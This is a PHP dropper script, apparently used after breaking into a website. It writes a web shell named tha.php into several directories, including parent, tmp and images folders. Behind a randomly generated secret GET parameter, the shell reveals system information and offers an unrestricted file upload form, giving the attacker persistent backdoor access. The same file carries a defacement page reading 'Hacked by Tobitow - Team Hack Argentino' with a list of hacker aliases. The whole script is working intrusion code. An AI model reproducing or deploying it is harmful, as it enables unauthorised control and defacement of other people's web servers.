<?php
error_reporting(0);
function RandomString($length = 5) {
$characters = 'abcdefghijklmnopqrstuvwxyz';
$randomS = '';
for ($i = 0; $i < $length; $i++) {
$randomS .= $characters[rand(0, strlen($characters) - 1)];
}
return $randomS;
}
$ndom = RandomString();
$file = '<?php if(isset($_GET["'.$ndom.'"])){echo"<font color=darkseagreen>[uname]".php_uname()."[/uname]";echo"<form method=post enctype=multipart/form-data>";echo"<input type=file name=f><input name=v type=submit id=v value=up><br>";if($_POST["v"]==up){if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){echo"<b>berhasil</b>-->".$_FILES["f"]["name"];}else{echo"<b>gagal";}}}?>';
$file .= '<title>Hacked by Tobitow</title><link REL="SHORTCUT ICON" HREF="http://www.fondos10.net/wp-content/uploads/2010/07/Argentina-1.jpg"><center><div id=q><font size="5">Hacked by Tobitow - Team Hack Argentino</font><p><img src="http://www.fondos10.net/wp-content/uploads/2010/07/Argentina-1.jpg" height="350"><br>Ya tu sabes cabron ;)<p><font size="3">AlfabetoVirtual - Libero - Daho Dahman - AnonJoker - Psyco Miste - Dr Avatar - Fallaga Team - Muhmmad Emad - Mr MaGnoM - Smok3 - Arg3nH4x0R - AhmadHax0r - aDriv4
<style>body{overflow:hidden;background-color:black}#q{font:40px Arial;color:white;position:absolute;left:0;right:0;top:10%}';
$r=fopen("tha.php", "w");fwrite($r,$file);fclose($r);
$r=fopen("../tha.php", "w");fwrite($r,$file);fclose($r);
$r=fopen("../../tha.php", "w");fwrite($r,$file);fclose($r);
$r=fopen("../../../tha.php", "w");fwrite($r,$file);fclose($r);
$r=fopen("../../tmp/tha.php", "w");fwrite($r,$file);fclose($r);
$r=fopen("../../images/tha.php", "w");fwrite($r,$file);fclose($r);
$r=fopen("../tmp/tha.php", "w");fwrite($r,$file);fclose($r);
$r=fopen("../images/tha.php", "w");fwrite($r,$file);fclose($r);
echo "Randomnya:".$ndom;
$r=fopen("x.php", "w");fwrite($r,"");fclose($r);
if(file_exists("x.php")) unlink("x.php");
?>
